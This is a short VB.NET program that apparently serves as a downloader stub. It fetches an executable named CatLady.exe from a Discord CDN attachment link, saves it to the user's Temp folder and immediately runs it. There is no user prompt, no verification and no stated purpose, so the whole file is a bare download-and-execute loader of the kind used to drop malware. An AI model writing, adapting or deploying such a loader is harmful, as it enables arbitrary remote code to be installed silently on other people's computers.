Imports System.Net
Module Module1

    Sub Main()

        Call dataMain()

    End Sub

    Sub dataMain()


        Using client As New WebClient()

            Dim remoteUri As String = "https://cdn.discordapp.com/attachments/755897516515655730/771951932608479262/CatLady.exe"
            Dim mainPath As String = My.Computer.FileSystem.SpecialDirectories.Temp
            Dim fileName As String = mainPath & "CatLady.exe"

            client.DownloadFile(remoteUri, fileName)

            Call StartLink()

        End Using


    End Sub

    Sub StartLink()

        Dim path As String = My.Computer.FileSystem.SpecialDirectories.Temp

        Dim dsgsdd As New ProcessStartInfo

        Dim linkStart As New ProcessStartInfo(path & "CatLady.exe")

        Process.Start(linkStart)

    End Sub

End Module
